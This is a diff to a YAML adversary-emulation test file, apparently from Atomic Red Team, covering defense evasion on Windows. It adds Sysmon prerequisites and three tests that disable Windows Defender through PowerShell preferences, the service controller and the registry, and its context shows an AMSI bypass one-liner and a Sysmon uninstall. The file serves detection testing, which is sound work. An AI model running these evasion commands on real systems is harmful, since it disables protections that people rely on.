@@ -106,6 +106,15 @@ atomic_tests:
       description: The name of the Sysmon filter driver (this can change from the default)
       type: string
       default: SysmonDrv
+
+  dependencies:
+  - description: |
+      Sysmon filter must be loaded
+    prereq_command: |
+      fltmc.exe filters | findstr #{sysmon_driver}
+    get_prereq_command: |
+      echo Automated installer not implemented yet, please install Sysmon manually
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -124,11 +133,13 @@ atomic_tests:
     This action requires HTTP logging configurations in IIS to be unlocked.
   supported_platforms:
     - windows
+
   input_arguments:
     website_name:
       description: The name of the website on a server
       type: string
       default: Default Web Site
+
   executor:
     name: powershell
     prereq_command: |
@@ -143,11 +154,35 @@ atomic_tests:
     Uninstall Sysinternals Sysmon for Defense Evasion
   supported_platforms:
     - windows
+
+  input_arguments:
+    sysmon_exe:
+      description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)
+      type: Path
+      default: PathToAtomicsFolder\T1089\bin\sysmon.exe
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sysmon executable must be available
+    prereq_command: |
+      if(cmd /c where sysmon) {0} else {1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
+      New-Item -ItemType Directory $parentpath -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
+      Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
+      if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
+  - description: |
+      Sysmon must be installed
+    prereq_command: |
+      if(cmd /c sc query sysmon) {0} else {1}
+    get_prereq_command: |
+      cmd /c sysmon -i -accepteula
+
   executor:
     name: command_prompt
     elevation_required: true
-    prereq_command: |
-      sc query sysmon > nul
     command: |
       sysmon -u
     cleanup_command: |
@@ -234,3 +269,51 @@ atomic_tests:
     elevation_required: false
     command: |
       [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+- name: Tamper with Windows Defender ATP PowerShell
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Set-MpPreference -DisableRealtimeMonitoring 1
+      Set-MpPreference -DisableBehaviorMonitoring 1
+      Set-MpPreference -DisableScriptScanning 1
+      Set-MpPreference -DisableBlockAtFirstSeen 1
+    cleanup_command: |
+      Set-MpPreference -DisableRealtimeMonitoring 0
+      Set-MpPreference -DisableBehaviorMonitoring 0
+      Set-MpPreference -DisableScriptScanning 0
+      Set-MpPreference -DisableBlockAtFirstSeen 0
+
+- name: Tamper with Windows Defender Command Prompt
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp
+  supported_platforms:
+    - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      sc stop WinDefend
+      sc config WinDefend start=disabled
+      sc query WinDefend
+    cleanup_command: |
+      sc start WinDefend
+      sc config WinDefend start=enabled
+
+- name: Tamper with Windows Defender Registry
+  description: |
+    Disable Windows Defender from starting after a reboot
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+    cleanup_command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
